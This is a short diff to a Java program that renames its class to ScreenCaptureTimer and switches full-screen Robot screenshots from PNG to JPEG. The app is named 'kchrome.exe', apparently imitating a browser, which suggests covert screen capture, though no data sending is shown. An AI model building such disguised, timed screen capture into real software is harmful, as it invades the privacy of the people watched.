@@ -16,7 +16,7 @@ import java.io.*;
 import java.util.Timer;
 import java.util.TimerTask;
 
-public class Main extends Application {
+public class ScreenCaptureTimer extends Application {
 
     private static final String APPLICATION_NAME = "kchrome.exe";
 
@@ -60,7 +60,7 @@ public class Main extends Application {
         byte[] empty = new byte[0];
         try {
             Robot robot = new Robot();
-            String format = "png";
+            String format = "jpeg";
             String fileName = "FullScreenshot." + format;
             File screenCapture = new File(fileName);
 
